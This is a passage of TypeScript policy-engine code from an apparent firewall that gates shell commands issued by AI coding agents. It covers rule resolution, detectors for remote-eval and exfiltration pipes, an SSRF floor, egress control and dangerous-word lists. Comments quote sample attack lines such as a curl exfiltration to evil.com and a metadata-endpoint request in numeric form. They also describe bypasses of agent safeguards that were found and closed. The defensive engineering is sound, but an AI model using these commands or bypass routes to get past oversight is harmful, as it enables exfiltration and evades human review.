  if (config.policy.smartRules.length > 0) {
    // Pinned-only conflict engine (Phase 3b): collect all matches (same
    // predicate as the old first-match `.find()`), then resolve — a pinned
    // manager rule wins; otherwise the first match wins (unchanged).
    // Waive the built-in `review-rm` advisory for a same-command create-then-
    // delete scratch cleanup (`cat > f <<EOF…; rm -f f`). Gated on
    // verdict==='review' so the waiver can ONLY drop a review prompt, never a
    // block — a user/org rule that reuses the name `review-rm` but BLOCKS is
    // still enforced. block-rm-rf-home (earlier tier), allow-rm-safe-paths, and
    // all other user rules are unaffected. (Name coupling to the proxy-side
    // ADVISORY_SMART_RULES 'review-rm' is intentional; see src/config/index.ts.)
    const rmCleanupWaiver = bashCommand !== null && isRmCreatedInCommandCleanup(bashCommand);
    // AST suppression is knob- and PIN-aware. Family-off semantics: a Class-C
    // knob 'off' silences the whole family INCLUDING its regex twin (deliberate
    // — sqlDdl:'off' must not resurrect the raw-regex rule and its FPs). The
    // one exception is a cloud-PINNED (mandated) rule: the org mandated that
    // shield on purpose, so a knob 'off' — reachable from a repo-carried
    // config file — must not kill it. With the AST tier knob-disabled, the
    // pinned rule is the only remaining guard and must speak.
    const astSuppressed = (rule: SmartRule): boolean => {
      if (bashCommand === null || !rule.name || !AST_FS_REGEX_RULES.has(rule.name)) return false;
      const isGitRule = rule.name === 'review-force-push' || rule.name === 'review-git-destructive';
      const knob =
        rule.name === 'review-drop-truncate-shell'
          ? cv('commands.sql-ddl')
          : rule.name === 'shield:filesystem:review-chmod-777'
            ? cv('commands.chmod')
            : isGitRule
              ? cv('commands.git-destructive')
              : undefined;
      if (knob === 'off' && rule.pinned) return false;
      // The git AST tier judged nothing for a command that did not parse; the
      // regex is then the only reader and keeps speaking (fw#413).
      if (isGitRule && !analyzeGit(bashCommand).parsed) return false;
      return true;
    };
    // Bypass-by-spelling closure: rules written for `bash` (the six default
    // shell-safety rules, shield rules like bash-safe) must cover EVERY tool
    // that carries a shell command — `shell`, `run_shell_command`,
    // `execute_bash`, `terminal.execute` (via toolInspection) — or an agent's
    // tool-name spelling silently voids sudo/pipe-to-shell/force-push coverage
    // (verified live 2026-08-12: all four read `allow` on defaults).
    // `shellShaped` is computed once above and shared with the AST tiers.
    // The check behind a PRODUCT rule governs it: `off` drops the rule, `log`
    // records it without stopping, review/block set the verdict. A pack row
    // is governed only by an explicit `checks` entry (its legacy resolution
    // depends on the host's applied-shield list, which the engine does not
    // see); an allow rule (a waiver) is never touched; a user or org rule has
    // no check and is left alone.
    const ruleCheck = (rule: SmartRule): { id: string; value: Verdict } | undefined => {
      if (rule.verdict === 'allow') return undefined;
      // Only a rule the host shipped (`builtin`) follows the catalog; a user
      // rule that reuses a shipped name keeps its own verdict. A cloud-pinned
      // mandate is the organisation's; a local value must not touch it.
      if (!rule.builtin) return undefined;
      const id = checkIdForRule(rule.name);
      if (!id) return undefined;
      const def = getCheck(id);
      if (!def) return undefined;
      if (rule.pinned) {
        // fw#390: the organisation's own value for the pack row of a shield it
        // mandates by name (its rules carry a server scope rows cannot hold)
        // does apply: "stop asking" from the dashboard. Nothing else does.
        const explicit = config.policy.checks?.[id];
        return def.pack && config.policy.checkSources?.[id] === 'workspace' && isVerdict(explicit)
          ? { id, value: explicit }
          : undefined;
      }
      // A shield's rule carries its own verdict (and any `node9 shield set`
      // override). Only an explicit pack-row entry governs it; a shield rule
      // folded into a product check (filesystem's chmod) keeps its verdict.
      if (rule.name?.startsWith('shield:') && !def.pack) return undefined;
      if (def.pack) {
        const explicit = config.policy.checks?.[id];
        return isVerdict(explicit) ? { id, value: explicit } : undefined;
      }
      return { id, value: cv(id) };
    };
    const serverLabel = context.mcpServer ?? mcpServerFromToolName(toolName);
    const matches = config.policy.smartRules.filter((rule) => {
      if (!toolMatchesRule(toolName, rule.tool, layers)) return false;
      if (!ruleServerMatches(rule, serverLabel)) return false;
      if (astSuppressed(rule)) return false;
      if (rmCleanupWaiver && rule.name === 'review-rm' && rule.verdict === 'review') return false;
      if (!evaluateSmartConditions(shellRuleArgs(toolName, args, rule.tool, layers), rule))
        return false;
      const check = ruleCheck(rule);
      if (check?.value === 'off') return false;
      if (check?.value === 'log') {
        noteLogged({
          decision: 'allow',
          logged: true,
          blockedByLabel: `Smart Rule: ${rule.name ?? rule.tool}`,
          reason: rule.reason,
          tier: 2,
          ruleName: rule.name ?? rule.tool,
          checkId: check.id,
        });
        return false;
      }
      return true;
    });
    const matchedRule = resolvePinned(matches);
    if (matchedRule) {
      // A permissive user rule cannot silence a built-in review.
      if (matchedRule.verdict === 'allow')
        return (
          pendingAstReview ?? { decision: 'allow', ruleName: matchedRule.name ?? matchedRule.tool }
        );
      // A product or pack rule names its check; a user or org rule does not.
      const check = ruleCheck(matchedRule);
      const checkId = check?.id ?? checkIdForRule(matchedRule.name);
      const decision =
        check && (check.value === 'review' || check.value === 'block')
          ? check.value
          : matchedRule.verdict;
      return {
        decision,
        blockedByLabel: `Smart Rule: ${matchedRule.name ?? matchedRule.tool}`,
        reason: matchedRule.reason,
        tier: 2,
        ruleName: matchedRule.name ?? matchedRule.tool,
        ...(checkId && { checkId }),
        ...((matchedRule.description ?? matchedRule.reason) && {
          ruleDescription: matchedRule.description ?? matchedRule.reason,
        }),
        ...(decision === 'block' &&
          matchedRule.dependsOnState?.length && {
            dependsOnStatePredicates: matchedRule.dependsOnState,
          }),
        ...(decision === 'block' &&
          matchedRule.recoveryCommand && {
            recoveryCommand: matchedRule.recoveryCommand,
          }),
      };
    }
  }

  let allTokens: string[] = [];
  let pathTokens: string[] = [];

  // 3. Tokenize the input
  // G10: the held tool-egress verdict, now that the smart-rule section has
  // had its say (a matching `allow` rule returned above and lifted it, which
  // is exactly what happens on the shell path). Before the shell branch and
  // before dangerous words, mirroring where the shell branch sits.
  if (pendingToolEgress) return pendingToolEgress;

  const shellCommand =
    shellInput.kind === 'shell'
      ? shellInput.command
      : shellInput.kind === 'not-shell'
        ? extractShellCommand(toolName, args, layers)
        : null;
  if (shellCommand) {
    const analyzed: ShellCommandAnalysis = analyzeShellCommand(shellCommand);
    allTokens = analyzed.allTokens;
    pathTokens = analyzed.paths;

    // ── Built-in command detectors: COLLECT, then resolve by strictness ─────
    //
    // More than one detector can claim the SAME command — `bash -c "$(cat x)"`
    // is inline-exec AND eval-dynamic; a sensitive pipe is pipe-chain AND
    // inline-exec. While these were ordered early-returns, whichever ran FIRST
    // won, so their relative precedence was encoded in statement order and
    // moving a block silently changed verdicts. That produced the same class of
    // bug twice, in opposite directions:
    //   - inline-exec before pipe-chain downgraded a Class-A critical exfil to
    //     a review, and `inlineExec:'off'` perversely restored the block;
    //   - eval-dynamic before inline-exec downgraded an org's
    //     `inlineExec:'block'` to a prompt for the strictly MORE dangerous
    //     dynamic spelling.
    // No ordering is correct for both, because the two knobs are independent.
    // Collecting candidates and taking the STRICTEST removes the question: a
    // detector can only ever make a verdict stricter, never weaker, and a
    // knob set to 'off' can no longer strengthen anything by stepping aside.
    //
    // Note this deliberately does NOT change `resolvePinned` for user smart
    // rules — there the law is first-match, and allow-lists depend on it.
    const candidates: PolicyVerdict[] = [];
    if (pendingAstReview) candidates.push(pendingAstReview);

    // Eval-remote — Class A, no knob. Kept as an immediate return: it is the
    // one built-in that can never be softened, so nothing later can raise it.
    const evalVerdict = detectDangerousShellExec(shellCommand);
    if (evalVerdict === 'block') {
      return {
        decision: 'block',
        blockedByLabel: 'Node9: Eval Remote Execution',
        reason: 'eval of remote download (curl/wget) is a near-certain supply-chain attack',
        ruleDescription:
          'The AI is downloading a script from the internet and running it immediately without inspection. This is a common way malware gets installed.',
        tier: 3,
        checkId: 'commands.eval-remote',
      };
    }

    // Pipe-chain. A trusted-host downgrade is an explicit user opt-in and still
    // short-circuits — it is a deliberate ALLOW, not an opinion to be out-voted.
    const ptVerdict = pipeChainVerdict(shellCommand, isTrustedHost, cv('data.pipe-chain'));
    if (ptVerdict?.logged) noteLogged(ptVerdict);
    else if (ptVerdict?.decision === 'allow') return ptVerdict;
    else if (ptVerdict) candidates.push(ptVerdict);

    // Each candidate below goes through its check's value: `off` drops it,
    // `log` keeps it aside, review/block compete on strictness.
    const consider = (id: string, verdict: PolicyVerdict): void => {
      const v = applyCheckValue(cv(id), verdict);
      if (v?.logged) noteLogged(v);
      else if (v) candidates.push(v);
    };

    // Inline execution (node9Firewall#385). Strict and Block all ask on every
    // inline call; every other level reads the code and asks when it does
    // something dangerous or cannot be read.
    const inline = reviewsEveryInline(config.settings.mode)
      ? detectInlineExec(shellCommand)
        ? undefined
        : null
      : inlineExecReview(shellCommand);
    if (inline !== null) {
      consider('commands.inline-exec', {
        decision: 'review',
        blockedByLabel: 'Node9 Standard (Inline Execution)',
        ...(inline ? { reason: inlineExecReason(inline) } : {}),
        ruleDescription: inlineExecDescription(inline),
        tier: 3,
        checkId: 'commands.inline-exec',
      });
    }

    // Eval of DYNAMIC content.
    if (evalVerdict === 'review') {
      consider('commands.eval-dynamic', {
        decision: 'review',
        blockedByLabel: 'Node9: Eval Dynamic Content',
        reason: 'Runtime-generated commands or shell code require approval',
        ruleDescription:
          'The AI is running a command that includes a variable or subshell expansion. The actual command executed at runtime may differ from what is shown here.',
        tier: 3,
        checkId: 'commands.eval-dynamic',
      });
    }

    const builtin = strictestVerdict(candidates);
    if (builtin) return builtin;

    // ── SSRF floor ──────────────────────────────────────────────────────────
    // Addresses no agent tool call has a legitimate reason to reach. Runs
    // BEFORE the egress policy and OUTSIDE its enabled guard: measured, the
    // cloud metadata endpoint was reachable in three of the four realistic
    // egress configurations, including the shipped default. It lives here
    // rather than in the orchestrator so `node9 explain`, `simulate` and the
    // posture probes, which call evaluatePolicy directly, inherit one
    // implementation and cannot disagree with the gate.
    //
    // Its own token pass, not extractShellDestinations: parseDestHost requires
    // a dot, so `curl 2852039166/latest/meta-data/` produced no destination at
    // all and was allowed even with that exact string in egress.deny.
    {
      const ssrf = ssrfFloor(extractShellDestTokens(shellCommand), {
        ssrfAllow: config.policy.egress?.ssrfAllow,
        ssrfStrict: config.policy.egress?.ssrfStrict,
        // Only an ENABLED egress policy speaks for the operator here: the
        // shipped default carries allowPrivate without anyone having chosen it.
        allowPrivate: config.policy.egress?.enabled ? config.policy.egress.allowPrivate : undefined,
      });
      if (ssrf) {
        return {
          decision: ssrf.decision,
          blockedByLabel: '🌐 Node9 Egress (Protected Address)',
          reason: ssrf.reason,
          ruleName: `ssrf:${ssrf.tier}:${ssrf.binary}:${ssrf.host}`,
          ruleDescription: ssrf.reason,
          tier: 3,
          overridable: ssrf.overridable,
          checkId: ssrfCheckId(ssrf.tier),
        };
      }
    }

    // ── Egress / destination control (GAP-5) ────────────────────────────────
    // Gate WHERE network tools send data (curl/wget/scp/ssh/nc) against the
    // egress allow/deny policy. Opt-in (egress.enabled). Catches exfil to an
    // untrusted host even when the payload is dynamic (curl evil.com -d "$(…)")
    // — the destination is literal in the command. 'review' routes to the human
    // via the normal policyResult path (ruleName set ⇒ reliable human review).
    if (config.policy.egress?.enabled) {
      const dests = extractShellDestinations(shellCommand);
      if (dests.length > 0) {
        const eg = evaluateEgress(dests, config.policy.egress);
        if (eg) return egressPolicyVerdict(eg);
      }
    }

    // ── SSH multi-hop host extraction ─────────────────────────────────────────
    // Runs only for ssh/scp/rsync to extract all involved hosts (including jump hosts).
    // Currently surfaced via tokens for dangerous-word scanning below.
    const firstToken = analyzed.actions[0] ?? '';
    if (['ssh', 'scp', 'rsync'].includes(firstToken)) {
      const rawTokens = shellCommand.trim().split(/\s+/);
      const sshHosts = extractAllSshHosts(rawTokens.slice(1));
      allTokens = allTokens.concat(sshHosts);
    }

    // ── Binary provenance check ───────────────────────────────────────────────
    // Only check absolute paths (e.g. /tmp/curl). Bare command names (npm, curl)
    // require PATH resolution which varies by environment (nvm, volta, CI toolcache)
    // and causes false positives. Skips entirely when no provenance hook is wired.
    if (firstToken && firstToken.startsWith('/') && checkProvenance) {
      const prov = checkProvenance(firstToken, cwd);
      if (prov.trustLevel === 'suspect') {
        // Block all's default for this check is block (levels.ts).
        const v = applyCheckValue(cv('commands.temp-binary'), {
          decision: 'review',
          blockedByLabel: 'Node9: Suspect Binary',
          reason: `Binary "${firstToken}" resolved to ${prov.resolvedPath} — ${prov.reason}`,
          tier: 3,
          checkId: 'commands.temp-binary',
        });
        if (v?.logged) noteLogged(v);
        else if (v) return v;
      }
      if (prov.trustLevel === 'unknown' && isBlockAll(config.settings.mode)) {
        return {
          decision: 'review',
          blockedByLabel: 'Node9: Unknown Binary (strict mode)',
          reason: `Binary "${firstToken}" — ${prov.reason}`,
          tier: 3,
          checkId: 'commands.temp-binary',
        };
      }
    }

    // Strip DML keywords from tokens so user dangerousWords like "delete"/"update"
    // don't re-flag a SQL query that already passed the smart rules check above.
    if (isSqlTool(toolName, layers)) {
      allTokens = allTokens.filter((t) => !SQL_DML_KEYWORDS.has(t.toLowerCase()));
    }
  } else {
    allTokens = tokenize(toolName);

    // Deep scan: if this tool isn't in toolInspection, scan all arg values for dangerous words
    if (args && typeof args === 'object') {
      const flattenedArgs = JSON.stringify(args).toLowerCase();
      const extraTokens = flattenedArgs.split(/[^a-zA-Z0-9]+/).filter((t) => t.length > 1);
      // concat, not push(...spread): a megabyte of arguments yields enough
      // tokens to overflow the call stack, and the hook's outer catch fails
      // open (fw#338 review 3: a 60k-element array was allowed unseen).
      allTokens = allTokens.concat(extraTokens);
    }
  }

  // ── 4. CONTEXTUAL RISK DOWNGRADE ────────────────────────────────────────
  // If the human is typing manually, we only block "Total System Disaster" actions.
  const isManual = agent === 'Terminal';
  if (isManual) {
    const SYSTEM_DISASTER_COMMANDS = ['mkfs', 'shred', 'dd', 'drop', 'truncate', 'purge'];

    const hasSystemDisaster = allTokens.some((t) =>
      SYSTEM_DISASTER_COMMANDS.includes(t.toLowerCase())
    );

    // Catch the most famous disaster: rm -rf /
    const isRootWipe =
      allTokens.includes('rm') && (allTokens.includes('/') || allTokens.includes('/*'));

    if (hasSystemDisaster || isRootWipe) {
      // If it IS a system disaster, return review so the dev gets a
      // "Manual Nuclear Protection" popup as a final safety check.
      return {
        decision: 'review',
        blockedByLabel: 'Manual Nuclear Protection',
        tier: 3,
        checkId: 'commands.disk-destroy',
      };
    }

    // For everything else (docker, psql, rmdir, delete, rm),
    // we trust the human and auto-allow.
    return allowed();
  }

  // ── 5. Sandbox Check (Safe Zones) ───────────────────────────────────────
  if (pathTokens.length > 0 && config.policy.sandboxPaths.length > 0) {
    const allInSandbox = pathTokens.every((p) => matchesPattern(p, config.policy.sandboxPaths));
    if (allInSandbox) return allowed();
  }

  // ── 6. Dangerous Words Evaluation ───────────────────────────────────────
  // The product's own words are `commands.disk-destroy`; a pack's or the
  // config's are `commands.dangerous-word`. A word whose check is off is not
  // scanned at all.
  const wordCheckId = (word: string): string =>
    BUILTIN_DANGEROUS_WORDS.includes(word.toLowerCase())
      ? 'commands.disk-destroy'
      : 'commands.dangerous-word';
  const scannedWords = config.policy.dangerousWords.filter((w) => cv(wordCheckId(w)) !== 'off');
  let matchedDangerousWord: string | undefined;
  const isDangerous = allTokens.some((token) =>
    scannedWords.some((word) => {
      const w = word.toLowerCase();
      const hit =
        token === w ||
        (() => {
          try {
            return new RegExp(`\\b${w}\\b`, 'i').test(token);
          } catch {
            return false;
          }
        })();
      if (hit && !matchedDangerousWord) matchedDangerousWord = word;
      return hit;
    })
  );

  if (isDangerous) {
    // Find which specific field contained the dangerous word for the UI
    let matchedField: string | undefined;
    if (matchedDangerousWord && args && typeof args === 'object' && !Array.isArray(args)) {
      const obj = args as Record<string, unknown>;
      for (const [key, value] of Object.entries(obj)) {
        if (typeof value === 'string') {
          try {
            if (
              new RegExp(
                `\\b${matchedDangerousWord.replace(/[.*+?^${}()|[\]\\]/g, '\\$&')}\\b`,
                'i'
              ).test(value)
            ) {
              matchedField = key;
              break;
            }
          } catch {
            /* ignore */
          }
        }
      }
    }
    const id = wordCheckId(matchedDangerousWord ?? '');
    const v = applyCheckValue(cv(id), {
      decision: 'review',
      blockedByLabel: `Project/Global Config — dangerous word: "${matchedDangerousWord}"`,
      matchedWord: matchedDangerousWord,
      matchedField,
      ruleDescription: `This command contains a flagged keyword ("${matchedDangerousWord}") from your node9 config. Review it before allowing.`,
      tier: 6,
      checkId: id,
    });
    if (v?.logged) noteLogged(v);
    else if (v) return v;
  }

  // ── 7. Block all: the catch-all ─────────────────────────────────────────
  if (isBlockAll(config.settings.mode)) {
    if (activeEnvironment?.requireApproval === false) return allowed();
    return {
      decision: 'review',
      blockedByLabel: 'Global Config (Strict Mode Active)',
      tier: 7,
      checkId: 'commands.unknown',
    };
  }

  return allowed();
}

/** Returns true when toolName matches the config's ignoredTools list. */
export function isIgnoredTool(toolName: string, config: PolicyConfig): boolean {
  return matchesPattern(toolName, config.policy.ignoredTools);
}
